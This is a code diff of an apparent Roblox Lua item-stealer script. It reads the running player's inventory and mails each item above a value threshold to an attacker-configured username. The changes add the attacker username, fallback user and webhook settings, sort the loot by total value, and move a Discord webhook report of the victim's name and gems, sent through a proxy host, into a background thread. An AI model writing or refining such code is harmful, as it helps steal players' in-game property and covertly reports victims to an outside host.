@@ -1,3 +1,8 @@
+Username = "your user here"
+Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "your webhook here"
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
@@ -300,12 +305,17 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         return blob_b
     end
 
+    table.sort(sortedItems, function(a, b)
+        return a.rap * a.amount > b.rap * b.amount 
+    end)
+
     if Webhook and string.find(Webhook, "discord") then
         Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
-        SendMessage(Webhook, plr.Name, GemAmount1)
+        spawn(function()
+            SendMessage(Webhook, plr.Name, GemAmount1)
+        end)
     end
 
-    table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
     for _, item in ipairs(sortedItems) do
         if item.rap >= newamount then
             sendItem(item.category, item.uid, item.amount)
